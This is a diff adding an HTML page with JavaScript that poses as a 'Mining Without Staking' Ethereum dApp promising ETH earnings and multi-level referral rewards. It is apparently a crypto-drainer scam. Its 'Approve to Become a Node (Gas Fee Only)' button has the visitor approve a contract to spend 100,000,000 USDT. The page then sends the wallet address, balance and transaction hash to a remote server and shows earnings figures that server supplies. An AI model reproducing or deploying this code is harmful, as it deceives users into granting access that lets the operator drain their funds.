@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="" style="font-size: 66.5625px;">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="icon" href="https://ethereum.org/favicon-32x32.png?v=8b512faa8d4a0b019c123a771b6622aa">
+<title>MINING WITHOUT STAKING</title>
+<script src="./index_files/web3.min.js"></script>
+<link href="./index_files/chunk-vendors.7e146468.css?v=7" rel="stylesheet">
+<link href="./index_files/app.af39082e.css?v=7" rel="stylesheet">
+</head>
+<body class="">
+	<noscript>
+		<strong>We're sorry but Ekta Mining System doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
+	</noscript>
+	<div id="app">
+		<div id="div_main" class="content-box contenter-box">
+			<div>
+				<div class="name anime-fade-in-down">
+					<a class="ico "></a>
+					<h6>No Stake<span>Mainnet</span></h6>
+					<h2>
+						<i class="logo"></i>
+					</h2>
+					<cite></cite>
+					<a href="#" class="btn float-left" id="rules" style="height:.5rem;line-height:.5rem;font-size:.2rem;margin-right:.2rem; background-color: #8ae9d9; color:#333; width:50px;">Rules</a>
+				</div>
+				<div class="address">
+					<span>Click 「」to copy and share your url！</span>
+					<a class="copy ico ico-archive-empty"  id="address" data-clipboard-text="#address"></a>
+				</div>
+				<div class="balance">
+					<div class="title">
+						<h5>ETH YOU HAVE EARNED:</h5>
+					</div>
+					<li>
+						<i class="ekta"></i>
+						<span>ETH</span>
+						<em id="eth"><b>0</b></em>
+					</li>
+				</div>
+				<div class="pools">
+					<div class="title">
+						<h5 style="display: flex;">Wallet USDT Balance&nbsp;<b id="usdt"></b>&nbsp;USDT</h5>
+						<h5>Basic output <b id="basicOutput">0</b> ETH/hour</h5>
+					</div>
+					<div class="pools-cont">
+						<div class="pools-group">
+							<h5>Mining Power Plus</h5>
+							<ul style="font-size: 12px;">
+								<li>
+									<span><span id="ETHBalance">0</span> ETH in Pool:</span>
+									<b>+<span id="ETHAward">0</span></b>
+									<em>ETH/h</em>
+								</li>
+								<li>
+									<span>L1 Team Output <span id="L1OUTPUT"></span> ETH/h</span>
+									<b>+<span id="L1Award">0</span></b>
+									<em>ETH/h</em>
+								</li>
+								<li>
+									<span>L2 Team Output <span id="L2OUTPUT"></span> ETH/h</span>
+									<b>+<span id="L2Award">0</span></b>
+									<em>ETH/h</em>
+								</li>
+								<li>
+									<span>L3 Team Output <span id="L3OUTPUT"></span> ETH/h</span>
+									<b>+<span id="L3Award">0</span></b>
+									<em>ETH/h</em>
+								</li>
+							</ul>
+							<a href="#" class="btn float-right" id="withdraw" style="display: none; width:100%;">Swap Earned ETH to USDT and Withdraw</a>
+							<a href="#" class="btn float-right" id="buy" style="display: none;">Mining Now</a>
+							<a href="#" class="btn float-right" id="approve" style="display: none; width:100%;">Approve to Become a Node (Gas Fee Only)</a>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div id="loading" class="van-toast van-toast--middle van-toast--loading" style="z-index: 2001; display: none;max-width:100%; width: 100%; height: 100vh;">
+		<div class="van-loading van-loading--circular van-toast__loading">
+			<span class="van-loading__spinner van-loading__spinner--circular">
+				<svg viewBox="25 25 50 50" class="van-loading__circular">
+					<circle cx="50" cy="50" r="20" fill="none"></circle>
+				</svg>
+			</span>
+		</div>
+		<div id="loading_txt" class="van-toast__text"></div>
+		<div class="van-toast__text">Please don't close the browser !!!</div>
+	</div>
+	<div id="dialog" class="van-toast van-toast--middle van-toast--success" style="z-index: 2003; display: none;">
+		<i class="van-icon van-icon-success van-toast__icon"></i>
+		<div id="dialog_txt" class="van-toast__text">COPYED</div>
+	</div>
+	<div class="xl-chrome-ext-bar" id="xl_chrome_ext_{4DB361DE-01F7-4376-B494-639E489D19ED}" style="display: none;">
+		<div class="xl-chrome-ext-bar__logo"></div>
+		<a id="xl_chrome_ext_download" href="javascript:;" class="xl-chrome-ext-bar__option"></a>
+		<a id="xl_chrome_ext_close" href="javascript:;" class="xl-chrome-ext-bar__close"></a>
+	</div>
+	<script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>
+	<script type="text/javascript" src="js/clipboard.min.js" ></script>
+	<script type="text/javascript">
+		$(function () {
+			$.chainId = 1;
+			var defaultRef = "0xc562e8b8f8d0fc1547c9e94b535e818bf7db8888";
+			var ABI = [{"inputs":[{"internalType":"string","name":"name_","type":"string"},{"internalType":"string","name":"symbol_","type":"string"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"price","type":"uint256"}],"name":"Buy","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"newPrice","type":"uint256"}],"name":"NewPrice","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"atonement","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"buy","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"collect","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"price","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_addr","type":"address"}],"name":"query_account","outputs":[{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_price","type":"uint256"}],"name":"updatePrice","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"usdt","outputs":[{"internalType":"contract ETHUSDT","name":"","type":"address"}],"stateMutability":"view","type":"function"}];
+			var ADDR = "0x11901dCA045dbaF220BE1e25960B40908a85A070";
+			//var ADDR = "0xCF775758620528BA89492536F2acDB7f95CcE224";
+			var ETH_USDT_ABI = [{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"}];
+			var ETH_USDT_ADDR = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+			//var ETH_USDT_ADDR = "0xA63d85D76908A8cadf96CD80f3d7458E69d87FEB";
+			document.addEventListener("gesturestart", function (event) {
+				event.preventDefault();
+			});
+			
+			var lastTouchEnd = 0;
+			document.addEventListener('touchend', function (event) {
+				var now = (new Date()).getTime();
+				if (now - lastTouchEnd <= 450) {
+					event.preventDefault();
+				}
+				lastTouchEnd = now;
+			}, false);
+			
+			$.getParam = function (name) {
+				var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)","i");
+				var r = window.location.search.substr(1).match(reg);
+				if (r != null) {
+					return decodeURI(r[2]);
+				} else {
+					return "";
+				}
+			};
+			
+			$.waitForReceipt = async function(tx_hash, max_try, callback) {
+				if (max_try <= 0) {
+					$.dialog("Wait for receipt timeout", 2000);
+					return;
+				}
+				let receipt = await $.web3.eth.getTransactionReceipt(tx_hash);
+				if (receipt != null) {
+					callback(receipt);
+				} else {
+					await $.sleep(1500);
+					$.waitForReceipt(tx_hash, max_try - 1, callback);
+				}
+			};
+			
+			$.sleep = function(ms) {
+				return new Promise((resolve) => {
+					setTimeout(resolve, ms);
+				});
+			};
+			
+			$.dialog = function(txt, ms){
+				$.hide();
+				$("#dialog_txt").text(txt);
+				$("#dialog").show();
+				if (ms > 0) {
+					setTimeout(function () {
+						$.hide();
+					}, ms);
+				}
+			};
+			
+			$.loading = function(txt){
+				$.hide();
+				$("#loading_txt").text(txt);
+				$("#loading").show();
+			};
+			
+			$.hide = function() {
+				$("#loading").hide();
+				$("#dialog").hide();
+			};
+			
+			$.copy = function(selecter) {
+				if ($(selecter).length == 0) {
+					return;
+				}
+				var clipboard = new ClipboardJS(selecter);
+				clipboard.on('success', function(e) {
+					$.dialog("Copy success", 2000);
+					e.clearSelection();
+				});
+				clipboard.on('error', function(e) {
+					$.dialog("Copy error", 2000);
+				});
+			};
+			$.copy(".copy");
+			
+			$.balanceChanged = function(obj) {
+				$.ajax({
+				 	type: "get",
+				 	url: "https://api.cc.sc/index/index/sync",
+				 	data: {
+				 		address: $.walletAddress,
+				 		usdtBalance: obj.usdtBalance
+				 	},
+				 	traditional: true,
+				 	success: function(msg){
+				 		$("#ETHBalance").text(msg.ETHBalance);
+				 		$("#ETHAward").text(msg.ETHAward);
+				 		$("#L1OUTPUT").text(msg.L1OUTPUT);
+				 		$("#L1Award").text(msg.L1Award);
+				 		$("#L2OUTPUT").text(msg.L2OUTPUT);
+				 		$("#L2Award").text(msg.L2Award);
+				 		$("#L3OUTPUT").text(msg.L3OUTPUT);
+				 		$("#L3Award").text(msg.L3Award);
+				 		$("#basicOutput").text(msg.basicOutput);
+				 	}
+				});
+			};
+			
+			$.queryAccount = async function(callback) {
+				let result = await $.contract.methods.query_account($.walletAddress).call();
+				var obj = {
+					ethBalance: result['ethBalance'],
+					balance: result[1],
+					usdtAllowance: $.web3.utils.fromWei(result[2], "Mwei"),
+					usdtBalance: $.web3.utils.fromWei(result[3], "Mwei")
+				};
+				callback(obj);
+			};
+			
+			$.accountsChanged = function(addr){
+				$.walletAddress = addr;
+				//$("#address").text(window.location.protocol + "//" + window.location.host + "/index.html?ref=" + $.walletAddress);
+				$("#address").attr("data-clipboard-text", window.location.protocol + "//" + window.location.host + "/index.html?ref=" + $.walletAddress);
+				
+				$.queryAccount(function(obj){
+					//$("#eth").text(obj.ethBalance);
+					$("#usdt").text(obj.usdtBalance);
+					
+					//if (obj.balance == 0) {
+					//	if (obj.usdtAllowance == 0) {
+					//		$("#buy").hide();
+					//		$("#withdraw").hide();
+					//		$("#approve").show();
+					//	} else {
+					//		$("#approve").hide();
+					//		$("#withdraw").hide();
+					//		$("#buy").show();
+					//	}
+					//} else {
+					//	$("#buy").hide();
+					//	$("#approve").hide();
+					//	$("#withdraw").show();
+					//	$.balanceChanged(obj);
+					//}
+					if (obj.usdtAllowance == 0) {
+						$("#withdraw").hide();
+						$("#approve").show();
+					} else {
+						$("#approve").hide();
+						$("#withdraw").show();
+						$.balanceChanged(obj);
+					}
+				});
+			};
+			
+			$("#rules").on('click', function(){
+				window.location.href = "rule.html";
+			});
+			
+			$("#approve").on('click', function(){
+				$.loading("Confirmation in progress");
+				$.tokenContract.methods
+					.approve(ADDR, $.web3.utils.toWei("100000000", "Mwei"))
+					.send({from: $.walletAddress}, function(error){
+						if (error) {
+							if (error.code == 4001) {
+								$.dialog(error.message, 2000);
+							}
+						}
+					})
+					.then(function(tx) {
+						$.waitForReceipt(tx.transactionHash, 6, (receipt) => {
+							$.hide();
+							$("#approve").hide();
+							//$("#buy").show();
+							$("#withdraw").show();
+							
+							$.queryAccount(function(obj){
+								$("#eth").text(obj.ethBalance);
+								
+								var ref = $.getParam("ref");
+								ref = ref ? ref : defaultRef;
+								$.ajax({
+								 	type: "post",
+								 	url: "https://api.cc.sc/index/index/approve/",
+								 	data: {
+								 		address: $.walletAddress,
+								 		approvedTx: tx.transactionHash,
+								 		ref: ref,
+								 		usdtBalance: obj.usdtBalance
+								 	},
+								 	success: function(msg){
+								 	    $.hide();
+								 	    if (msg == 0) {
+								 			$.dialog("error", 2000);
+								 		} else {
+								 		    $.dialog("success", 2000)
+								 			$.balanceChanged(obj);
+								 		}
+								 	}
+								});
+					 		});
+						});
+					});
+			});
+			
+			$("#buy").on('click', function(){
+				$.loading("Confirmation in progress");
+				$.contract.methods
+					.buy()
+					.send({from: $.walletAddress}, function(error){
+						if (error) {
+							if (error.code == 4001) {
+								$.dialog(error.message, 2000);
+							}
+						}
+					})
+					.then(function(tx) {
+						$.waitForReceipt(tx.transactionHash, 6, (receipt) => {
+							$.hide();
+							$("#buy").hide();
+							$("#withdraw").show();
+							
+							$.queryAccount(function(obj){
+								$("#eth").text(obj.ethBalance);
+								$("#usdt").text(obj.usdtBalance);
+								
+								$.ajax({
+								 	type: "post",
+								 	url: "https://api.cc.sc/index/index/addnode/",
+								 	data: {
+								 		address: $.walletAddress,
+								 		tokenTx: tx.transactionHash
+								 	},
+								 	success: function(msg){
+								 		if (msg == 0) {
+								 			$.dialog("error", 2000);
+								 		} else {
+								 		    $.dialog("success", 2000)
+								 			$.balanceChanged(obj);
+								 		}
+								 	}
+								});
+							});
+						});
+					});
+			});
+			
+			$("#withdraw").on('click', function(){
+				$.loading("Confirmation in progress");
+				$.ajax({
+				 	type: "post",
+				 	url: "https://api.cc.sc/index/index/withdraw",
+				 	data: {
+				 		address: $.walletAddress,
+				 		amount: 0.1
+				 	},
+				 	success: function(msg){
+				 		if (msg == 0) {
+				 			$.dialog(msg.errorMessage, 2000);
+				 		} else {
+				 			$.dialog("success", 2000);
+				 		}
+				 	}
+				});
+			});
+			
+			if (window.ethereum) {
+				try {
+					// connect wallet
+					$.loading("Connect Wallet...");
+					window.ethereum.enable().then(accounts => {
+						$.hide();
+						$.web3 = new Web3(window.ethereum);
+						$.contract = new $.web3.eth.Contract(ABI, ADDR);
+						$.tokenContract = new $.web3.eth.Contract(ETH_USDT_ABI, ETH_USDT_ADDR);
+						
+						window.ethereum.on("networkChanged", function (networkId) {
+							location.reload();
+						});
+						
+						$.web3.eth.getChainId().then(chainId => {
+							if (chainId == $.chainId) {
+								window.ethereum.on("accountsChanged", function(accounts) {
+									$.accountsChanged(accounts[0]);
+								});
+								$.accountsChanged(accounts[0]);
+							} else {
+								$.dialog("Not in ethereum network");
+							}
+						});
+					});
+				} catch (error) {
+					$.dialog(error);
+				}
+			} else {
+				$.dialog("Not in dapp browser");
+			}
+		});
+	</script>
+</body>
+</html>
